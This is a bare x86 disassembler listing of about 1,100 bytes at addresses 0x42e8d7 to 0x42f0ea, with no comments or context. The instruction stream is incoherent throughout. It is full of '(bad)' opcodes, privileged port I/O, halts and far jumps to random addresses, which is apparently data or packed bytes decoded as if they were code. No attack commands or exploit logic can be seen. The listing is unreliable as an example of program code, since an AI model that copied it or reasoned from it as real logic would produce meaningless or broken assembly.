  42e8d7:	in     al,dx
  42e8d8:	(bad)  
  42e8da:	f2xm1  
  42e8dc:	lock into 
  42e8de:	(bad)  
  42e8e0:	aam    0xd7
  42e8e2:	add    esp,ebp
  42e8e4:	add    cl,al
  42e8e6:	add    eax,edi
  42e8e8:	rcl    bh,1
  42e8ea:	out    0xc6,eax
  42e8ec:	jmp    0xaf23f1fa
  42e8f1:	leave  
  42e8f2:	in     al,0xe9
  42e8f4:	cmc    
  42e8f5:	test   eax,0xb6f0d6cf
  42e8fa:	mov    eax,0x2febbb6
  42e8ff:	int3   
  42e900:	ret    
  42e901:	loopne 0x42e8d6
  42e903:	fyl2xp1 
  42e905:	out    0xd8,al
  42e907:	fnstsw ax
  42e909:	(bad)  
  42e90a:	(bad)  
  42e90b:	jmp    0xc3e1:0xc4fdd9e1
  42e912:	aad    0xcc
  42e914:	iret   
  42e915:	jecxz  0x42e8eb
  42e917:	mov    edx,0xf5f7e5fb
  42e91c:	clc    
  42e91d:	int3   
  42e91e:	add    ebp,esp
  42e920:	repnz fxam 
  42e923:	faddp  st(5),st
  42e925:	(bad)  
  42e926:	cmc    
  42e927:	leave  
  42e928:	or     dl,bh
  42e92a:	std    
  42e92b:	add    al,0xc5
  42e92d:	add    al,0xe3
  42e92f:	vpor   xmm5,xmm2,XMMWORD PTR [ebp-0x12123044]
  42e937:	call   0xdb3ec402
  42e93c:	mov    eax,0xd403bbd1
  42e941:	aam    0xc1
  42e943:	add    esp,ecx
  42e945:	(bad)  
  42e946:	hlt    
  42e947:	ret    0xe9da
  42e94a:	loop   0x42e94e
  42e94c:	or     DWORD PTR [edx],eax
  42e94e:	fsubp  st(0),st
  42e950:	leave  
  42e951:	(bad)  
  42e952:	mov    esp,0xedcad5c3
  42e957:	out    0xae,al
  42e959:	(bad)  
  42e95a:	in     eax,dx
  42e95b:	in     al,0xd4
  42e95d:	fidivr WORD PTR [eax-0xc38422a]
  42e963:	mov    esi,0xeac0fafa
  42e968:	jmp    0xd91bde2e
  42e96d:	fsub   st,st(6)
  42e96f:	(bad)  
  42e970:	fisubr WORD PTR [edi-0x341b4218]
  42e976:	(bad)  
  42e977:	(bad)
  42e97a:	imul   bh
  42e97c:	out    dx,eax
  42e97d:	stc    
  42e97e:	call   0xe2fcd874
  42e983:	hlt    
  42e984:	loope  0x42e981
  42e986:	rol    bl,0xf0
  42e989:	std    
  42e98a:	call   0xeb1dd358
  42e98f:	out    0xe3,eax
  42e991:	mov    bl,0xe4
  42e993:	(bad)
  42e996:	out    dx,al
  42e997:	mov    dh,0xd4
  42e999:	ror    al,1
  42e99b:	int    0xb2
  42e99d:	mov    esi,0xbefcee01
  42e9a2:	rcr    bl,cl
  42e9a4:	add    al,al
  42e9a6:	idiv   esi
  42e9a8:	pop    es
  42e9a9:	fadd   DWORD PTR [edi]
  42e9ab:	fisttp WORD PTR [ecx]
  42e9ad:	retf   
  42e9ae:	paddsw mm6,QWORD PTR [eax-0x2c0d3530]
  42e9b5:	cmc    
  42e9b6:	shl    edi,1
  42e9b8:	scas   al,BYTE PTR es:[edi]
  42e9b9:	(bad)  
  42e9bb:	mov    ebx,0xc8c8eaca
  42e9c0:	hlt    
  42e9c1:	fadd   QWORD PTR [ebx]
  42e9c3:	(bad)  
  42e9c5:	fcom   st(2)
  42e9c7:	out    0xf,al
  42e9c9:	clc    
  42e9ca:	jmp    0xb8e8:0xdcc508
  42e9d1:	jmp    0x42e99e
  42e9d3:	mov    cl,0xd7
  42e9d5:	rol    eax,0xd3
  42e9d8:	fbstp  TBYTE PTR [edi-0x113b2a2b]
  42e9de:	fiadd  WORD PTR [ecx]
  42e9e0:	fabs   
  42e9e2:	sti    
  42e9e3:	repz not esi
  42e9e6:	add    al,BYTE PTR [ecx]
  42e9e8:	stc    
  42e9e9:	mov    BYTE PTR [ebx],0xf
  42e9ec:	or     ah,ah
  42e9ee:	into   
  42e9ef:	fucomp st(3)
  42e9f1:	(bad)  
  42e9f3:	mov    bh,0xe3
  42e9f5:	ret    0xb9f1
  42e9f8:	out    dx,eax
  42e9f9:	xlat   BYTE PTR ds:[ebx]
  42e9fa:	mov    bh,0xb4
  42e9fc:	int3   
  42e9fd:	retf   
  42e9fe:	mov    eax,0xdebfb6ba
  42ea03:	aad    0xff
  42ea05:	cmc    
  42ea06:	loop   0x42ea03
  42ea08:	(bad)  
  42ea09:	loopne 0x42e9e5
  42ea0b:	or     cl,cl
  42ea0d:	or     edi,esi
  42ea0f:	out    0xea,eax
  42ea11:	shr    BYTE PTR [ebp+edx*8-0x2e18080c],cl
  42ea18:	mov    cl,0xe7
  42ea1a:	in     al,0xb4
  42ea1c:	out    dx,al
  42ea1d:	fnstcw WORD PTR [edi-0x1432a47]
  42ea23:	fcmovb st,st(6)
  42ea25:	out    0xe0,al
  42ea27:	mov    edi,0xeccbf9e4
  42ea2c:	jmp    0xccc4:0xf1eedcd8
  42ea33:	call   0xbbf4d713
  42ea38:	aad    0xb9
  42ea3a:	out    dx,al
  42ea3b:	int3   
  42ea3c:	mov    dh,0xd2
  42ea3e:	mov    ah,0xff
  42ea40:	pop    es
  42ea41:	mov    edi,0xd7f5edd0
  42ea46:	loope  0x42ea4c
  42ea48:	mov    esi,0xfe70ee0
  42ea4d:	sti    
  42ea4e:	rsm    
  42ea50:	sar    DWORD PTR [ebp-0x111b3b19],1
  42ea56:	mov    dl,0xb3
  42ea58:	icebp  
  42ea59:	cli    
  42ea5a:	in     al,dx
  42ea5b:	mov    bh,0xb5
  42ea5d:	cld    
  42ea5e:	mov    esi,0xf0c1fee2
  42ea63:	lock shl edx,cl
  42ea66:	or     edx,eax
  42ea68:	mov    bh,0xd5
  42ea6b:	add    al,0xe5
  42ea6d:	jecxz  0x42ea59
  42ea6f:	ffreep st(7)
  42ea71:	out    0xe8,eax
  42ea73:	(bad)  
  42ea74:	mov    al,0xef
  42ea76:	aam    0xe5
  42ea78:	aad    0xf5
  42ea7a:	aad    0xc4
  42ea7c:	mov    dh,0xec
  42ea7e:	rcr    ecx,1
  42ea80:	aam    0xe0
  42ea82:	fcmovnbe st,st(7)
  42ea84:	cld    
  42ea85:	add    edx,edi
  42ea87:	ret    
  42ea88:	(bad)
  42ea8b:	add    edi,esp
  42ea8d:	jmp    0x42ea76
  42ea8f:	shr    ecx,cl
  42ea91:	retf   
  42ea92:	retf   
  42ea93:	iret   
  42ea94:	ror    ebp,cl
  42ea96:	xlat   BYTE PTR ds:[ebx]
  42ea97:	test   edx,0xcccaeace
  42ea9d:	ffreep st(2)
  42ea9f:	call   0xf800cd72
  42eaa4:	loop   0x42eaa4
  42eaa6:	lock in al,0xea
  42eaa9:	call   0xc90fd472
  42eaae:	out    dx,al
  42eaaf:	retf   0xccc2
  42eab2:	shr    DWORD PTR [ebp-0x72e142a],1
  42eab8:	mov    bh,0xef
  42eaba:	in     al,0xca
  42eabc:	fcomip st,st(5)
  42eabe:	fcomip st,st(2)
  42eac0:	hlt    
  42eac1:	neg    edx
  42eac3:	(bad)  
  42eac5:	mov    ecx,0xd50401c1
  42eaca:	aad    0xfa
  42eacc:	call   0xef20cc96
  42ead1:	jmp    0xc337e085
  42ead6:	(bad)  
  42ead7:	mov    ah,0xcd
  42ead9:	hlt    
  42eada:	in     eax,dx
  42eadb:	out    dx,al
  42eadc:	aad    0xc3
  42eade:	leave  
  42eadf:	call   0xdb19c4d3
  42eae4:	(bad)  
  42eae5:	fcomp  st(0)
  42eae7:	(bad)  
  42eae8:	fcmovnbe st,st(4)
  42eaea:	or     ch,bl
  42eaec:	loop   0x42eae7
  42eaee:	fsubrp st(7),st
  42eaf0:	jmp    0xf6c1:0xe7f3efe7
  42eaf7:	(bad)  [eax-0x25084519]
  42eafd:	aam    0xbb
  42eaff:	fld    DWORD PTR [edx]
  42eb01:	add    eax,edi
  42eb03:	div    esi
  42eb05:	repz out 0xf6,al
  42eb08:	add    al,0xd6
  42eb0a:	in     al,0xca
  42eb0c:	loopne 0x42eaf3
  42eb0e:	fisubr DWORD PTR [ebp-0x1413320f]
  42eb14:	mov    dh,0xd5
  42eb16:	loope  0x42eb12
  42eb18:	in     eax,dx
  42eb19:	aam    0xde
  42eb1b:	sti    
  42eb1c:	test   bl,0xd2
  42eb1f:	(bad)  
  42eb20:	mov    edx,0xf3fdd207
  42eb25:	aam    0xf5
  42eb27:	push   es
  42eb28:	cli    
  42eb29:	or     cl,bl
  42eb2b:	loop   0x42eb1b
  42eb2d:	jmp    0xe116bd31
  42eb32:	call   0xee24dbf3
  42eb37:	stc    
  42eb38:	lock mov ch,0xbf
  42eb3b:	shr    dl,1
  42eb3d:	into   
  42eb3e:	repz sti 
  42eb40:	shl    ebx,1
  42eb42:	not    ch
  42eb44:	add    ch,bh
  42eb46:	or     eax,ebx
  42eb48:	sar    ah,1
  42eb4a:	cld    
  42eb4b:	or     al,0xe8
  42eb4d:	add    esp,esp
  42eb4f:	int    0xae
  42eb51:	(bad)  
  42eb53:	lods   eax,DWORD PTR ds:[esi]
  42eb54:	lods   al,BYTE PTR ds:[esi]
  42eb55:	out    dx,al
  42eb56:	in     eax,0xf3
  42eb58:	retf   
  42eb59:	xlat   BYTE PTR ds:[ebx]
  42eb5a:	jmp    0xf9e9:0xf1ced0e9
  42eb61:	iret   
  42eb62:	cld    
  42eb63:	(bad)  
  42eb65:	stc    
  42eb66:	fisttp DWORD PTR [ecx]
  42eb68:	dec    DWORD PTR [edi]
  42eb6a:	prefetch (bad)
  42eb6b:	or     eax,0xea020ae0
  42eb70:	jmp    0xcdc2:0xc3b2dde0
  42eb77:	vpmaxsw ymm7,ymm2,YMMWORD PTR [ebx-0x4f21010c]
  42eb7f:	call   0xd21fec4c
  42eb84:	loope  0x42eb91
  42eb86:	or     al,BYTE PTR [ebx]
  42eb88:	or     esi,eax
  42eb8a:	stc    
  42eb8b:	(bad)  
  42eb8c:	in     eax,0xc5
  42eb8e:	or     eax,0xe3d1c2e1
  42eb93:	(bad)  
  42eb94:	in     eax,0xda
  42eb96:	iret   
  42eb97:	repnz fcmovnb st,st(7)
  42eb9a:	out    0xc8,al
  42eb9c:	fxch   st(2)
  42eb9e:	clc    
  42eb9f:	mov    ebp,0xfab8cce7
  42eba4:	les    ecx,FWORD PTR [edx]
  42eba6:	jmp    edx
  42eba8:	jmp    0xf40baa1
  42ebad:	add    eax,0xd3d8d008
  42ebb2:	jmp    0xc30e9a79
  42ebb7:	xlat   BYTE PTR ds:[ebx]
  42ebb8:	loopne 0x42eb75
  42ebba:	rcr    edi,1
  42ebbc:	rcr    ecx,cl
  42ebbe:	shl    ecx,cl
  42ebc0:	mov    esp,0xdfdff4d5
  42ebc5:	mov    ecx,0xe2e8c4b8
  42ebca:	sti    
  42ebcb:	fucomip st,st(0)
  42ebcd:	ror    ecx,0xab
  42ebd0:	(bad)  
  42ebd1:	out    dx,eax
  42ebd2:	lock mov ch,0xf0
  42ebd5:	xlat   BYTE PTR ds:[ebx]
  42ebd6:	out    dx,eax
  42ebd7:	(bad)  
  42ebd9:	mov    dh,0xb5
  42ebdb:	jmp    0x42ebda
  42ebdd:	stc    
  42ebde:	mov    al,0xc9
  42ebe0:	out    dx,eax
  42ebe1:	xlat   BYTE PTR ds:[ebx]
  42ebe2:	add    ah,dl
  42ebe4:	(bad)  
  42ebe6:	or     al,dh
  42ebe8:	or     al,bh
  42ebea:	pop    es
  42ebeb:	clc    
  42ebec:	add    al,bl
  42ebee:	fdivr  QWORD PTR [ebp+ebp*8-0x351d122e]
  42ebf5:	aad    0xc1
  42ebf7:	leave  
  42ebf8:	mov    ch,0xea
  42ebfa:	iret   
  42ebfb:	in     eax,0xdd
  42ebfd:	(bad)  
  42ebff:	cld    
  42ec00:	rcl    bh,1
  42ec02:	mov    edi,0xd8dad4db
  42ec08:	test   esp,0xc1dbe7ed
  42ec0e:	cld    
  42ec0f:	jmp    0xbd21b2d2
  42ec14:	xlat   BYTE PTR ds:[ebx]
  42ec15:	int    0xe4
  42ec17:	shr    edi,1
  42ec19:	hlt    
  42ec1a:	leave  
  42ec1b:	std    
  42ec1c:	mov    ch,0xe9
  42ec1e:	fdiv   st,st(6)
  42ec20:	loope  0x42ec22
  42ec22:	repz faddp st(3),st
  42ec25:	aam    0x6
  42ec27:	add    esi,edi
  42ec29:	cld    
  42ec2a:	pop    es
  42ec2b:	fxch   st(6)
  42ec2d:	in     al,0xe0
  42ec2f:	mov    eax,0xb5c5f6f0
  42ec34:	lods   al,BYTE PTR ds:[esi]
  42ec35:	iret   
  42ec36:	jmp    0x42ebe8
  42ec38:	int    0xde
  42ec3a:	in     eax,dx
  42ec3b:	sar    DWORD PTR [ebx-0x2a0f240e],1
  42ec41:	shl    ebx,1
  42ec43:	aad    0xd3
  42ec45:	jecxz  0x42ec18
  42ec47:	(bad)
  42ec4a:	mov    esp,0xeb13dbe3
  42ec4f:	ror    ebx,cl
  42ec51:	loop   0x42ec35
  42ec53:	div    ah
  42ec55:	icebp  
  42ec56:	aam    0xd6
  42ec58:	xlat   BYTE PTR ds:[ebx]
  42ec59:	(bad)  
  42ec5a:	in     al,0xd5
  42ec5c:	repnz repnz mov ebx,0xe0f1fabe
  42ec63:	(bad)  
  42ec65:	jmp    0x42ec61
  42ec67:	jecxz  0x42ec74
  42ec69:	add    ebp,eax
  42ec6b:	aad    0xeb
  42ec6d:	repz icebp 
  42ec6f:	into   
  42ec70:	mov    dl,0xd3
  42ec72:	shl    edi,cl
  42ec74:	mov    bh,0xac
  42ec76:	retf   0xced9
  42ec79:	mov    ecx,0xefb6f0ce
  42ec7e:	ffreep st(2)
  42ec80:	sar    bh,1
  42ec82:	add    edi,esp
  42ec84:	rol    BYTE PTR [eax],1
  42ec86:	mov    eax,0x3c7e105
  42ec8c:	fiadd  WORD PTR [ecx]
  42ec8e:	sar    BYTE PTR [ecx-0x5431083d],0xf5
  42ec95:	rol    ch,cl
  42ec97:	call   0xfb29a185
  42ec9c:	mov    edi,0xf5bee2de
  42eca1:	std    
  42eca2:	rol    bh,cl
  42eca4:	aam    0xd9
  42eca6:	jmp    0x42ec8c
  42eca8:	fucomip st,st(6)
  42ecaa:	(bad)  
  42ecab:	in     eax,0xfc
  42ecad:	jmp    0x42ecb7
  42ecaf:	lods   eax,DWORD PTR ds:[esi]
  42ecb0:	retf   0xe7c6
  42ecb3:	lods   eax,DWORD PTR ds:[esi]
  42ecb4:	mov    cl,0xa9
  42ecb6:	shl    bh,cl
  42ecb8:	shl    cl,cl
  42ecba:	call   0xd83fa174
  42ecbf:	mov    ecx,0xcde0dcf0
  42ecc4:	sar    esi,1
  42ecc6:	ret    
  42ecc7:	jmp    0xcedd:0xcbcac500
  42ecce:	in     al,dx
  42eccf:	in     eax,0xaf
  42ecd1:	mov    edi,0xc3d0dcde
  42ecd6:	stc    
  42ecd7:	in     al,dx
  42ecd8:	cmc    
  42ecd9:	int3   
  42ecda:	aam    0xb3
  42ecdc:	aad    0xb9
  42ecde:	loope  0x42ecc1
  42ece0:	int3   
  42ece1:	add    dl,bh
  42ece3:	mov    esp,0xc2c5dddd
  42ece8:	stc    
  42ece9:	cld    
  42ecea:	std    
  42eceb:	jmp    0x42ecdc
  42eced:	into   
  42ecee:	or     al,dl
  42ecf0:	stos   BYTE PTR es:[edi],al
  42ecf1:	fsubr  QWORD PTR [esi-0x3f1a0b3a]
  42ecf7:	leave  
  42ecf8:	mov    ebx,0xbcceb4ed
  42ecfd:	mov    edx,0xd102f601
  42ed02:	mov    ah,0xf0
  42ed04:	loop   0x42eccb
  42ed06:	clc    
  42ed07:	in     eax,0xc4
  42ed09:	out    dx,al
  42ed0a:	pop    es
  42ed0b:	in     eax,dx
  42ed0c:	hlt    
  42ed0d:	jmp    0x42eceb
  42ed0f:	fdiv   QWORD PTR [edx-0x1d485316]
  42ed15:	mov    bl,0xdb
  42ed17:	fxch   st(2)
  42ed19:	mov    bh,0xcf
  42ed1b:	(bad)  
  42ed1d:	fucomp st(5)
  42ed1f:	aam    0xf7
  42ed21:	fidiv  WORD PTR [edi+eax*1+0x9d7dee1]
  42ed28:	or     eax,DWORD PTR [edi]
  42ed2a:	fiadd  DWORD PTR [ecx]
  42ed2c:	fucompp 
  42ed2e:	push   cs
  42ed2f:	fnstenv [eax-0x4d493313]
  42ed35:	jmp    0xd5de:0xf9bbf1c4
  42ed3c:	int    0xd7
  42ed3e:	mov    ebp,0xbccfd8f4
  42ed43:	add    al,0xdc
  42ed45:	les    edi,FWORD PTR [ebx+ebx*8-0x30073e1b]
  42ed4c:	leave  
  42ed4d:	jecxz  0x42ed47
  42ed4f:	loopne 0x42ecf7
  42ed51:	into   
  42ed52:	(bad)  
  42ed53:	(bad)  
  42ed55:	ret    0xc4f4
  42ed58:	in     eax,0xb1
  42ed5a:	mov    ch,0xd5
  42ed5c:	mov    ebx,0xf6bdc2f5
  42ed61:	loopne 0x42ed68
  42ed63:	add    bl,dh
  42ed65:	loop   0x42ed42
  42ed67:	mov    edi,0xcdc7d500
  42ed6c:	cld    
  42ed6d:	add    ecx,edi
  42ed6f:	in     al,dx
  42ed70:	enter  0xf6e9,0xb2
  42ed74:	in     al,0xcd
  42ed76:	repz out 0xd8,eax
  42ed79:	lock fidivr WORD PTR [edx-0x31360110]
  42ed80:	loopne 0x42ed5c
  42ed82:	(bad)  
  42ed83:	mov    esp,0xe7fcc302
  42ed88:	add    al,0xdf
  42ed8a:	sti    
  42ed8b:	retf   
  42ed8c:	out    0xcf,al
  42ed8e:	icebp  
  42ed8f:	in     eax,0xe8
  42ed91:	out    0xc8,eax
  42ed93:	in     eax,0xfb
  42ed95:	rol    cl,0xd0
  42ed98:	aam    0xf4
  42ed9a:	clc    
  42ed9b:	mov    dh,0xcc
  42ed9d:	enter  0xbfd0,0xfd
  42eda1:	pop    es
  42eda2:	lock rcl ch,0xd6
  42eda6:	sti    
  42eda7:	add    bl,al
  42eda9:	cmc    
  42edaa:	(bad)  
  42edab:	out    dx,eax
  42edac:	stc    
  42edad:	loop   0x42ed87
  42edaf:	icebp  
  42edb0:	fadd   st,st(3)
  42edb2:	lods   al,BYTE PTR ds:[esi]
  42edb3:	out    0xd2,eax
  42edb5:	(bad)  
  42edb7:	cli    
  42edb8:	aad    0xb6
  42edba:	neg    ch
  42edbc:	leave  
  42edbd:	mov    esi,0xc7ecefcc
  42edc2:	loope  0x42ed96
  42edc4:	loop   0x42edcb
  42edc6:	aam    0x6
  42edc8:	rcr    ebp,0xd5
  42edcb:	clc    
  42edcc:	aam    0xd
  42edce:	(bad)  
  42edcf:	loope  0x42edbe
  42edd1:	ret    0xf3e3
  42edd4:	jmp    0x42edbb
  42edd6:	leave  
  42edd7:	int3   
  42edd8:	cli    
  42edd9:	ffreep st(4)
  42eddb:	repz in al,0xf0
  42edde:	aad    0xe8
  42ede0:	mov    esi,0xc1e2fffc
  42ede5:	jecxz  0x42edde
  42ede7:	mov    edi,0xe5cb03d7
  42edec:	jmp    0x42edef
  42edee:	repz sar DWORD PTR [esi-0x1a2f123c],0xf3
  42edf6:	jmp    0x42edeb
  42edf8:	out    0xe4,al
  42edfa:	icebp  
  42edfb:	mov    bl,0xe3
  42edfd:	cmc    
  42edfe:	sar    DWORD PTR [ebx+eiz*8-0x3309fa0b],1
  42ee05:	or     dh,al
  42ee07:	push   es
  42ee08:	retf   
  42ee09:	add    edi,esp
  42ee0b:	into   
  42ee0c:	in     al,dx
  42ee0d:	(bad)
  42ee10:	leave  
  42ee11:	out    dx,al
  42ee12:	call   0xd42fb709
  42ee17:	(bad)  
  42ee19:	mov    ah,0xfb
  42ee1b:	std    
  42ee1c:	(bad)  
  42ee1e:	(bad)  
  42ee1f:	mov    ebx,0xe0cdfd
  42ee24:	sti    
  42ee25:	fadd   st(5),st
  42ee27:	fucom  st(1)
  42ee29:	xlat   BYTE PTR ds:[ebx]
  42ee2a:	or     eax,0x50be3
  42ee2f:	leave  
  42ee30:	enter  0xdee3,0xb6
  42ee34:	int3   
  42ee35:	shl    dl,1
  42ee37:	(bad)  
  42ee39:	(bad)  [eax-0x4b40312c]
  42ee3f:	aad    0xf2
  42ee41:	add    bh,BYTE PTR [esi+0x2d3dcff]
  42ee47:	in     al,0x6
  42ee49:	shl    ecx,0xe2
  42ee4c:	(bad)  
  42ee4e:	shl    BYTE PTR [ebx-0x8381a15],cl
  42ee54:	cmc    
  42ee55:	mov    cl,0xe0
  42ee57:	ror    eax,cl
  42ee59:	(bad)  
  42ee5a:	(bad)  
  42ee5c:	stc    
  42ee5d:	fcmovbe st,st(0)
  42ee5f:	mov    edx,0xe4f3f8cf
  42ee64:	push   es
  42ee65:	out    0xf8,al
  42ee67:	fcmovbe st,st(5)
  42ee69:	out    dx,eax
  42ee6a:	or     bl,dh
  42ee6c:	or     ecx,DWORD PTR [esi]
  42ee6e:	jmp    0xcb21b53c
  42ee73:	loopne 0x42ee39
  42ee75:	jmp    0xdc2ed66f
  42ee7a:	mov    bh,0xd3
  42ee7c:	mov    ebp,0xd8e0cab4
  42ee81:	iret   
  42ee82:	inc    bh
  42ee84:	test   al,0xc0
  42ee87:	fadd   DWORD PTR [eax]
  42ee89:	cli    
  42ee8a:	out    0x0,eax
  42ee8c:	or     eax,0xd3b8f2fb
  42ee91:	in     al,0xe4
  42ee93:	ror    dl,0xc9
  42ee96:	(bad)
  42ee99:	lods   eax,DWORD PTR ds:[esi]
  42ee9a:	aad    0xff
  42ee9c:	out    dx,eax
  42ee9d:	jecxz  0x42ee5c
  42ee9f:	mov    edx,0xe5f103f0
  42eea4:	repz add ecx,DWORD PTR [edx]
  42eea7:	add    eax,edx
  42eea9:	sar    dh,0xcf
  42eeac:	fninit 
  42eeae:	adc    edx,esi
  42eeb0:	scas   eax,DWORD PTR es:[edi]
  42eeb1:	(bad)
  42eeb4:	scas   al,BYTE PTR es:[edi]
  42eeb5:	cli    
  42eeb6:	lock test dh,0xdb
  42eeba:	out    dx,eax
  42eebb:	jmp    0x42ee86
  42eebd:	call   0xdb3cec9f
  42eec2:	icebp  
  42eec3:	ret    0xf9d7
  42eec6:	loopne 0x42eed0
  42eec8:	std    
  42eec9:	fadd   QWORD PTR [eax]
  42eecb:	aad    0x4
  42eecd:	(bad)  [ebx+esi*4]
  42eed0:	mov    edi,0xedb6eaee
  42eed5:	lock fld st(1)
  42eed8:	jmp    0xf4d8:0xbdb7d0ce
  42eedf:	lock jecxz 0x42eeb4
  42eee2:	aam    0xf1
  42eee4:	cmc    
  42eee5:	clc    
  42eee6:	add    edi,ebx
  42eee8:	stc    
  42eee9:	loop   0x42eee8
  42eeeb:	cmc    
  42eeec:	jmp    0xefcf:0xe2f3cde8
  42eef3:	scas   eax,DWORD PTR es:[edi]
  42eef4:	mov    ah,0xc9
  42eef6:	(bad)  
  42eef7:	test   edi,0xfcffe9ee
  42eefd:	stc    
  42eefe:	sar    DWORD PTR [esi-0x1e423118],cl
  42ef04:	cld    
  42ef05:	rcr    cl,0xd0
  42ef08:	cmc    
  42ef09:	fsub   st(0),st
  42ef0b:	or     ecx,eax
  42ef0d:	into   
  42ef0e:	rol    ch,0xcd
  42ef11:	ret    0xd6ad
  42ef14:	jecxz  0x42eedf
  42ef16:	mov    ch,0xe4
  42ef18:	fucompp 
  42ef1a:	out    0xfe,al
  42ef1c:	leave  
  42ef1d:	mov    ecx,0xddf8f3ed
  42ef22:	loope  0x42ef2a
  42ef24:	jecxz  0x42ef1e
  42ef26:	fld    DWORD PTR ds:0xc6cabde4
  42ef2c:	push   cs
  42ef2d:	retf   0xaac9
  42ef30:	mov    esi,0xf4d4e4bc
  42ef35:	jmp    0xf9fe:0xfab1f8c0
  42ef3c:	sar    edx,cl
  42ef3e:	not    eax
  42ef40:	jecxz  0x42ef12
  42ef42:	lock fld DWORD PTR [edi]
  42ef45:	cmc    
  42ef46:	pop    es
  42ef47:	or     ah,al
  42ef49:	pop    es
  42ef4a:	cld    
  42ef4b:	add    eax,0xe10ae3eb
  42ef50:	into   
  42ef51:	call   0xd609c113
  42ef56:	shl    BYTE PTR [ecx-0x10444727],cl
  42ef5c:	mov    esi,0xccdbdcb9
  42ef61:	sti    
  42ef62:	fidivr DWORD PTR [ebp+0x7fdc5f1]
  42ef68:	push   es
  42ef69:	inc    DWORD PTR [ebx]
  42ef6b:	jmp    0xdf44df50
  42ef70:	call   0xc934b76b
  42ef75:	shr    edx,0xc1
  42ef78:	repnz mov dh,0xb4
  42ef7b:	stc    
  42ef7c:	enter  0xdaea,0xcc
  42ef80:	inc    edi
  42ef82:	pop    es
  42ef83:	mov    esp,0xae0dff2
  42ef88:	xlat   BYTE PTR ds:[ebx]
  42ef89:	fadd   st(0),st
  42ef8b:	loope  0x42ef51
  42ef8d:	(bad)  
  42ef8e:	in     eax,dx
  42ef8f:	fmul   st(2),st
  42ef91:	loope  0x42ef50
  42ef93:	mov    bl,0xf0
  42ef95:	repz shl edi,cl
  42ef98:	iret   
  42ef99:	imul   DWORD PTR [edi+ebp*8-0x25290c48]
  42efa0:	pop    es
  42efa1:	shl    DWORD PTR [edx+esi*8-0x4f93d08],cl
  42efa8:	retf   
  42efa9:	cli    
  42efaa:	sldt   edx
  42efad:	fldl2t 
  42efaf:	shl    al,cl
  42efb1:	loopne 0x42ef76
  42efb3:	mov    ch,0xe0
  42efb5:	(bad)  
  42efb6:	leave  
  42efb7:	int    0xcf
  42efb9:	fstp   TBYTE PTR [ebx-0x24230f08]
  42efbf:	ret    0xbcda
  42efc2:	lock dec BYTE PTR [ebx]
  42efc5:	repnz (bad) 
  42efc7:	(bad)  
  42efc9:	fadd   st,st(7)
  42efcb:	retf   0xe9c2
  42efce:	repnz fidivr WORD PTR [ebp-0x2a0e3252]
  42efd5:	shl    DWORD PTR [esp+eiz*8-0x3b0d522d],cl
  42efdc:	lock sar DWORD PTR [ebp-0x241f0c31],1
  42efe3:	cli    
  42efe4:	aad    0xe7
  42efe6:	cmc    
  42efe7:	loop   0x42efd9
  42efe9:	(bad)  
  42efeb:	stc    
  42efec:	repz call 0xa903d8fa
  42eff2:	call   0xce3a9cb8
  42eff7:	mov    dh,0xc5
  42effa:	in     al,0xbd
  42effc:	icebp  
  42effd:	fdiv   st(2),st
  42efff:	xlat   BYTE PTR ds:[ebx]
  42f000:	mul    ecx
  42f002:	hlt    
  42f003:	sti    
  42f004:	xlat   BYTE PTR ds:[ebx]
  42f005:	cld    
  42f006:	mul    bl
  42f008:	add    eax,0xf4eedec0
  42f00d:	cld    
  42f00e:	ror    al,cl
  42f010:	ret    
  42f011:	fdivrp st(2),st
  42f013:	fnsave [ecx-0x34071e57]
  42f019:	cli    
  42f01a:	jmp    0xc1e2:0xe1f1ced7
  42f021:	aad    0xfc
  42f023:	in     eax,dx
  42f024:	push   es
  42f025:	clc    
  42f026:	cmc    
  42f027:	mul    ebx
  42f029:	add    ebp,esp
  42f02b:	loope  0x42f017
  42f02d:	retf   
  42f02e:	cli    
  42f02f:	out    0xc5,eax
  42f031:	in     eax,0xac
  42f033:	loop   0x42eff7
  42f035:	into   
  42f036:	xlat   BYTE PTR ds:[ebx]
  42f037:	(bad)  
  42f038:	aad    0xb7
  42f03a:	int    0xef
  42f03c:	fcomip st,st(0)
  42f03e:	bnd ret 
  42f040:	loop   0x42f01c
  42f042:	loop   0x42f043
  42f044:	loop   0x42f03f
  42f046:	hlt    
  42f047:	in     eax,0xe3
  42f049:	(bad)  
  42f04a:	push   cs
  42f04b:	(bad)  
  42f04c:	jmp    0xedf2d32d
  42f051:	out    0xea,al
  42f053:	ret    0xb3d1
  42f056:	(bad)  
  42f057:	iret   
  42f058:	jmp    0xed0fee23
  42f05d:	(bad)  
  42f05f:	fst    st(6)
  42f061:	shl    ebx,cl
  42f063:	mov    ebx,0xf1e305c3
  42f068:	mul    eax
  42f06a:	fst    st(4)
  42f06c:	in     eax,0xe3
  42f06e:	in     al,dx
  42f06f:	int3   
  42f070:	in     al,0xe8
  42f072:	ret    
  42f073:	(bad)
  42f077:	ror    ebp,0xf2
  42f07a:	mov    ch,0xd1
  42f07c:	out    dx,eax
  42f07d:	mov    edi,0xd1fbcdcc
  42f082:	(bad)  
  42f083:	(bad)  
  42f085:	cld    
  42f086:	(bad)  
  42f087:	in     al,0xe9
  42f089:	(bad)  
  42f08a:	mov    esp,0xe1edf80f
  42f08f:	ret    0xf1cd
  42f092:	loopne 0x42f068
  42f094:	retf   0xb6b7
  42f097:	mov    bl,0xd9
  42f099:	not    esp
  42f09b:	call   0xe011be94
  42f0a0:	dec    ebp
  42f0a2:	in     eax,dx
  42f0a3:	ret    0xd5d3
  42f0a6:	add    dh,cl
  42f0a8:	fsubr  st(5),st
  42f0aa:	jmp    0xe5f0:0xe813dbdc
  42f0b1:	mov    al,0xf5
  42f0b3:	lods   al,BYTE PTR ds:[esi]
  42f0b4:	iret   
  42f0b5:	retf   
  42f0b6:	in     eax,dx
  42f0b7:	out    0xf6,al
  42f0b9:	out    dx,eax
  42f0ba:	aam    0xc8
  42f0bc:	push   eax
  42f0be:	leave  
  42f0bf:	int3   
  42f0c0:	into   
  42f0c1:	aad    0xed
  42f0c3:	add    bh,dh
  42f0c5:	fadd   DWORD PTR ds:0xc40b03d6
  42f0cb:	add    edi,edi
  42f0cd:	jmp    0x42f0d2
  42f0cf:	ret    0xd2bc
  42f0d2:	mov    esp,0xf2e0d7f1
  42f0d7:	out    dx,eax
  42f0d8:	fcmovu st,st(7)
  42f0da:	clc    
  42f0db:	leave  
  42f0dc:	mov    dl,0xbe
  42f0de:	iret   
  42f0df:	sar    eax,1
  42f0e1:	repz lock rcl bh,1
  42f0e5:	retf   
  42f0e6:	out    0xb,al
  42f0e8:	aam    0xf6
  42f0ea:	cmc    
